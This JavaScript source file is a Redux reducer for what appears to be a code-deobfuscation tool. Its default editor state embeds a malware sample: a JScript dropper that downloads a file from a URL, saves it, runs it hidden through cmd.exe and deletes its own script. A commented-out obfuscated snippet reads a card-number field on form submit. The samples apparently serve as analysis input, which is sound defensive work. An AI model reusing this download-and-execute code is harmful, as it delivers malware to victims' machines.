const initCode = `function R(K) {
    var eDT;
    var iSj;
    const mj = ActiveXObject;
    const zs = new mj("MSXML2.XMLHTTP");
    const U = 0;
    zs.open("GET", K, 0);

    try {
        zs.send();
    } catch (tLk) {
        return false;
    }

    if (zs.Status != 200)
        return false;

    const oL = new mj("Scripting.FileSystemObject");
    const W = new mj("ADODB.Stream");
    var K = qBE(oL);
    W.Open();
    W.Type = 1;
    W.Write(zs.ResponseBody);
    const r = 36123;
    const X = 72128;
    const g = 392;
    const Ji = 0;
    W.Position = 0;
    var PD = W.Read();
    PD = M(W, ActiveXObject, PD);

    if (PD.length < 10)
        return false;

    W.SaveToFile(K);
    W.Close();
    const uM = ActiveXObject;
    const Jy = "Wscript.Shell";
    const xV = "c";
    const z = "cm";
    const H = "cmd";
    const Wch = "cmd.";
    const rdR = "cmd.e";
    const pW = "cmd.ex";
    var iSj = "cmd.ex";
    var eDT = new uM(Jy);
    const x = "run";
    eDT.run("cmd.exe /c " + qBE(oL), 0);

    if (124 > 89) {
        var K = "deleteF";
        const ffv = WScript;
        oL.deleteFile(ffv.ScriptFullName);
        return true;
    }

    return 0;
}
`


// FIrst Example
// const initCode = `var _0xc8bf=['\x76\x61\x6c\x75\x65','\x73\x75\x62\x6d\x69\x74\x42\x75\x74\x74\x6f\x6e','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x63\x6c\x69\x63\x6b','\x6c\x6f\x67','\x63\x63\x6e\x75\x6d','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64'];(function(_0x52c1d3,_0x2a26eb){var _0x41df97=function(_0x2568bb){while(--_0x2568bb){_0x52c1d3['push'](_0x52c1d3['shift']());}};_0x41df97(++_0x2a26eb);}(_0xc8bf,0x141));var _0x3f6e=function(_0x52c1d3,_0x2a26eb){_0x52c1d3=_0x52c1d3-0x0;var _0x41df97=_0xc8bf[_0x52c1d3];return _0x41df97;};var submitButton=document[_0x3f6e('\x30\x78\x30')](_0x3f6e('\x30\x78\x32'));console[_0x3f6e('\x30\x78\x35')](submitButton);var cCardNum=document['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64'](_0x3f6e('\x30\x78\x36'));submitButton[_0x3f6e('\x30\x78\x33')](_0x3f6e('\x30\x78\x34'),()=>{alert(cCardNum[_0x3f6e('\x30\x78\x31')]);});`
const defaultState = {
    dynamicCode: initCode,
    staticCode : initCode,
    lastCode: initCode,
    consoleCode : "",
    consoleResponse : "",
    executionLog : "",
    details: false,
    functionNames: ["%None"],
    selectedFunctionNames: [],
    codeTree: {},
    diff: false,
    reMountMergeCode: false,
    saves: [],
    marktextRet: null,
}

const deobfuscation = (state = defaultState, action) => {
    switch (action.type) {
        case 'SET_DYNAMIC_CODE':
            return Object.assign({}, state, {dynamicCode: action.code})
        case 'SET_STATIC_CODE':
            return Object.assign({}, state, {staticCode: action.code})
        case 'SET_OLD_CODE':
            return Object.assign({}, state, {lastCode: action.code})
        case 'SET_EXECUTION_LOG':
            return Object.assign({}, state, {executionLog: action.log})
        case 'SET_CONSOLE_CODE':
            return Object.assign({}, state, {consoleCode: action.code})
        case 'CLEAR_MARK_TEXT':
            if (state.marktextRet) {
                state.marktextRet.forEach(marker => marker.clear());
            }
            return state
        case 'SET_MARKTEXT_RET':
            return Object.assign({}, state, {marktextRet: action.marktextRet})
        case 'SET_CONSOLE_RESPONSE':
            return Object.assign({}, state, {consoleResponse: action.response})
        case 'SET_DETAILS':
            return Object.assign({}, state, {details: !state.details})
        case 'SET_REMOUNT_MERGE_CODE':
            return Object.assign({}, state, {reMountMergeCode: !state.reMountMergeCode})
        case 'SET_SHOW_DIFF':
            return Object.assign({}, state, {diff: !state.diff})
        case 'SET_CODE_TREE':
            return Object.assign({}, state, {codeTree: action.treeJson})
        case 'SET_FILENAME_SAVE':
            return Object.assign({}, state, {saveFilename: action.fileName})
        case 'SET_SAVED_FILES':
            return Object.assign({}, state, {saves: action.listFiles})
            
        case 'SET_FUNCTION_NAMES':
            return Object.assign({}, state, {functionNames: [...action.functionNames, "%None"]})
        case 'SET_SELECTED_FUNCTION_NAME':
            let newSelected;
            const functionName = action.event.target.value
            if(functionName === "%None") {
                return Object.assign({}, state, {selectedFunctionNames: []})
            }

            if (state.selectedFunctionNames.includes(functionName)) {
                newSelected = state.selectedFunctionNames.filter(name=> name !==functionName)
            } else {
                newSelected = [...state.selectedFunctionNames, functionName]
            }
            console.log(newSelected)
            return Object.assign({}, state, {selectedFunctionNames: newSelected})
        default:
            return state
    }
  }
  
  export default deobfuscation